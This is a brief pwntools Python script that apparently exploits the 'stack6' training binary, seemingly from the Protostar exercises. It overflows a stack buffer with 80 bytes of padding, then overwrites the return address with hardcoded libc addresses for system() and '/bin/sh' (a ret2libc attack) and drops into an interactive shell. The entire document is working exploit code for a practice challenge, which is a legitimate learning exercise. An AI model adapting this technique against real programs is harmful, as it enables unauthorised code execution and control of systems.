from pwn import *

context.log_level = 'debug'

f = 'stack6'
p = process('../problems/' + f)
b = ELF('../problems/' + f)

padding = 'A'*80
syst3m = p32(0xf7e0c9e0)  # ret to system 
ebp = 'BBBB'
bin_sh = p32(0xf7dce000 + 0x17eaaa)

payload = padding + syst3m + ebp + bin_sh

p.sendline(payload)

p.recv()

p.interactive()
